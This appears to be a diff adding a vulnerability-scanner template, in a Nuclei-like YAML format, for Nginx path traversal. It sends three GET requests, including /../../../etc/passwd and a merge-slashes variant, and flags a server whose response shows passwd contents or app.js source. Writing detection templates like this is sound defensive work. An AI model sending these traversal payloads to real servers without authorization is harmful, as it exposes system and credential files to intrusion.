@@ -1,0 +1,32 @@
+id: nginx-merge-slashes-path-traversal
+name: Nginx Server - Local File Inclusion
+severity: high
+confidence: tentative
+description: Nginx server is vulnerable to local file inclusion.
+reference: CWE-22
+tags:
+- exposure
+- config
+- lfi
+- nginx
+- vuln
+requests:
+- method: GET
+  path: /../../../etc/passwd
+  matchers: &id001
+  - type: regex
+    regex:
+    - 'root:.*:0:0:'
+    - app.listen
+  - type: status
+    status:
+    - 200
+  condition: and
+- method: GET
+  path: /static///////../../../../etc/passwd
+  matchers: *id001
+  condition: and
+- method: GET
+  path: /../app.js
+  matchers: *id001
+  condition: and
